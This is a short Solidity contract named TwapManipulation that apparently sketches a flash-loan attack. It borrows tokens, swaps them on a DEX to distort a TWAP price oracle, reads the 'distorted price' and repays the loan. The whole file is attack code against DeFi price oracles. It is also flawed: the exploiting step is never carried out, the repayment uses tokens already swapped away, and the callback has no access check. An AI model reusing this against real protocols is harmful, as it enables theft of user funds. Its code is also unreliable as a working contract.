
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
}

interface ITwap {
    function consult(address token, uint256 amountIn) external view returns (uint256);
}

interface IDex {
    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
}

interface IFlashLender {
    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
}

contract TwapManipulation {
    ITwap public twap;
    IDex public dex;
    IFlashLender public lender;

    constructor(address _twap, address _dex, address _lender) {
        twap = ITwap(_twap);
        dex = IDex(_dex);
        lender = IFlashLender(_lender);
    }

    function attack(address tokenIn, address tokenOut, uint256 amount) external {
        lender.flashLoan(address(this), tokenIn, amount, abi.encode(tokenIn, tokenOut));
    }

    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
        (address tokenIn, address tokenOut) = abi.decode(data, (address, address));

        // Push price inside the observation window
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        dex.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);

        // Oracle now reports a distorted price; trigger the dependent action
        uint256 distortedPrice = twap.consult(tokenOut, 1e18);

        // Repay the flash loan
        IERC20(token).transfer(msg.sender, amount);
    }
}
